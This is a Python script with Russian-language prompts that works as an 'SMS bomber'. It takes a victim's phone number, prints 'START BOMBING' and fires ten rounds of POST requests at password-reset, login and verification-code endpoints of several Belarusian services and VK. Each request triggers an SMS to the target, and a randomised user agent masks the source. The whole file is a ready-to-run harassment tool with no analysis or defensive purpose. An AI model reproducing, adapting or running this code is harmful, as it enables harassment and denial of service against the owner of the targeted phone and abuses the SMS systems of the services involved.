from email import header
import fake_useragent
import requests
from pyfiglet import Figlet

user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
number = input('Введите номер телефона: ')
if len(number) == 13:
    parsed_number = number[1:]
    parsed_number1= number[1:4]+' '+'('+number[4:6]+')' +' '+ number[6:9]+'-'+number[9:11]+'-'+number[11:13]
    parsed_number3= number[:4]+' '+number[4:6]+' '+ number[6:9]+'-'+number[9:11]+'-'+number[11:13]
    parsed_number2= '('+number[4:6]+')' +' '+ number[6:9]+'-'+number[9:11]+'-'+number[11:13]
else:
    print('Номер введён не верно')
def figlet():
    previwe_message = Figlet(font = 'slant')     
    print(previwe_message.renderText('START BOMBING'))
def bomber(num1,num2,num3):
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    try:
        response = requests.post('https://5element.by/user/login', headers= headers, data = {'login' : num3[0:-1]})
        print('успешно отправленно')
    except:
        print("что то пошло не так")    
    try:
        response = requests.post('https://imarket.by/ajax/auth.php', headers = headers, data = {'PHONE_NUMBER' : num1})
        print("успешно отправленно")
    except:
        print('что то пошло не так')    
    try:
        response = requests.post('https://7745.by/reset-password', headers = headers, data = {'prefix': '375', 'login' : num2})
        print('успешно отправленно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://tokiny.by/?ajax=1&task=sendVerificationCode',headers=headers,json={'tel': num1})
        print('Отправка')
    except:
        print('что то пошло не так')    
    try:
        response = requests.post('https://vk.com/activation.php?act=change_phone_phone', headers = headers, data = {'phone': num1})
        print('успешно отправленно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://pzz.by/api/v1/clients/password', headers = headers, data = {'phone' : num1})
        print('Сообщение высланно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://api.papajohns.by/user/confirm-code', headers = headers, 
        json = {'lang': "ru", 'city_id': "1", 'platform': "web", 'type': "recovery_password", 'phone': num1})
        print('Отправленно')
    except:
        print('что то пошло не так')
    try:
        response = requests.post('https://api.vk.com/method/auth.validatePhone?v=5.148&client_id=7733222', headers = headers, data = {'phone':num1})
        print('успешно отправленно')
    except:
        print('что то пошло не так')       
    try:
        response = requests.post('https://auth.135.by/api/client/sms', headers = headers,json= {'phone': num1})
        print('отправка прошла успешно')
    except: 
        print('что то пошло не так')
        

figlet()
for i in range(10):
    bomber(parsed_number3,parsed_number2,number)